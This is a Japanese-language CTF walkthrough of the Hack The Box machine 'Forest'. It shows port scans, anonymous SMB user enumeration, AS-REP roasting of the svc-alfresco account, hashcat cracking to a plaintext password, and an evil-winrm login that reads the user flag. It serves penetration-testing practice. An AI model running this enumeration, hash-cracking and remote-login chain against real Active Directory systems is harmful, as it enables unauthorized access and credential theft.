## STEP 1
```sh
└─$ rustscan -a 10.129.95.210 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Scanning ports: The virtual equivalent of knocking on doors.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.95.210:53
Open 10.129.95.210:88
Open 10.129.95.210:593
Open 10.129.95.210:636
Open 10.129.95.210:3269
Open 10.129.95.210:3268
Open 10.129.95.210:5985
Open 10.129.95.210:9389
Open 10.129.95.210:47001
Open 10.129.95.210:49665
Open 10.129.95.210:49666
Open 10.129.95.210:49668
Open 10.129.95.210:49664
Open 10.129.95.210:49671
Open 10.129.95.210:49685
Open 10.129.95.210:49680
Open 10.129.95.210:49681
Open 10.129.95.210:49700
10.129.95.210 -> [53,88,593,636,3269,3268,5985,9389,47001,49665,49666,49668,49664,49671,49685,49680,49681,49700]
```
```sh
└─$ nmap -n -Pn -p53,88,593,636,3269,3268,5985,9389,47001,49665,49666,49668,49664,49671,49685,49680,49681,49700 10.129.95.210
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-05 08:31 EDT
Nmap scan report for 10.129.95.210
Host is up (0.51s latency).

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49671/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
49685/tcp open  unknown
49700/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 1.18 seconds
```


## STEP 2
anonymousでユーザ列挙できた
```sh
└─$ netexec smb -u '' -p '' --users 10.129.95.210
SMB         10.129.95.210   445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) 
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.210   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain 
SMB         10.129.95.210   445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.210   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account 
SMB         10.129.95.210   445    FOREST           DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.129.95.210   445    FOREST           $331000-VK4ADACQNUCA          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_2c8eef0a09b545acb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_75a538d3025e4db9a          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_681f53d4942840e18          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1b41c9286325456bb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_9b69f1b9d2cc45549          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_7c96b981967141ebb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_c75ee099d0a64c91b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1ffab36a2f5f479cb          <never>             0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0        
SMB         10.129.95.210   445    FOREST           sebastien                     2019-09-20 00:29:59 0        
SMB         10.129.95.210   445    FOREST           lucinda                       2019-09-20 00:44:13 0        
SMB         10.129.95.210   445    FOREST           svc-alfresco                  2025-07-05 13:17:35 0        
SMB         10.129.95.210   445    FOREST           andy                          2019-09-22 22:44:16 0        
SMB         10.129.95.210   445    FOREST           mark                          2019-09-20 22:57:30 0        
SMB         10.129.95.210   445    FOREST           santi                         2019-09-20 23:02:55 0        
SMB         10.129.95.210   445    FOREST           [*] Enumerated 31 local users: HTB
```
先ほどのユーザからパスワードが設定されているものでasreproastしてみると、svc-alfrescoのチケットを取得できた
```sh
└─$ netexec ldap -u user.txt -p '' --asreproast hash.txt 10.129.95.210
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        10.129.95.210   389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:b8ac6afe475d465388ca3af9cf81bcc3$562a9861d3d6a745f2cb236bf12aa287ca1c1f82b88e0a28b34f06e85a13f14545828fd51cfa1217285ce79f4944d1c69e892a291e64786906e07dbaab448dd28afe95cec0876e3876182146bc16c0f9c6fdc901cc671f31cbf2385c2181a15df1c57e7d5ec2e9a158a157ce9fd00470b2d0c7e5339070134e309a2f443e65022a13be2019095c9a3c8bdff97d5950e3f7fb41f39585eee3213d784cfd01953208af9e41915f7c3edf1fa999ad49a41614637dbc33f3a587a971312ea2c793cece327931ff0cae9bd1fe20b410d32edb147fc13458bf21c79024897c72463b118afca401a0e
```
クラック成功！
```sh
└─$ hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) Ultra 7 155H, 2099/4263 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a3ee92654df112839cc$0dd5ff910de59a4a493ccd35c2041ba09030a48456f83526b167a68de43e50d4296132ad2f1105edc8da7c403622748b1be39d3764d4a55f47692a11a0d3a22a930f99e8fcb2946479c1941a64dc3365574dac8eb90c6809f600b2208d23e3115913bffd939b882f9388e85686bdc9193eb995dbf08ce66477a908f8796d9b1de64b01542b14f87ae923624aa948d694a515631cc65409c9cd226cb15a68665075b64b16d93518a69669a2aa49d762bb1f01165de9a2c1589be998123d0dbf3f38b65a4c663983c0a3f63da157482050b5525bb8bba82e6df2d67699c1981f229f8ac61ba1b3:s3rvice
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-alfresco@HTB.LOCAL:fb19a093db509a...1ba1b3
Time.Started.....: Sat Jul  5 09:42:35 2025 (3 secs)
Time.Estimated...: Sat Jul  5 09:42:38 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1076.1 kH/s (0.74ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4085760/14344385 (28.48%)
Rejected.........: 0/4085760 (0.00%)
Restore.Point....: 4084736/14344385 (28.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: s456822 -> s3r3ndipit
Hardware.Mon.#1..: Util: 83%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => Started: Sat Jul  5 09:42:18 2025
Stopped: Sat Jul  5 09:42:39 2025
```
5985番ポートが開いていたので、取得したクレデンシャルでログイン成功！ユーザフラグゲット
```sh
└─$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cat C:\Users\svc-alfresco\Desktop\user.txt
b52be94e8c18f9cdabcfb7709a922a97
```
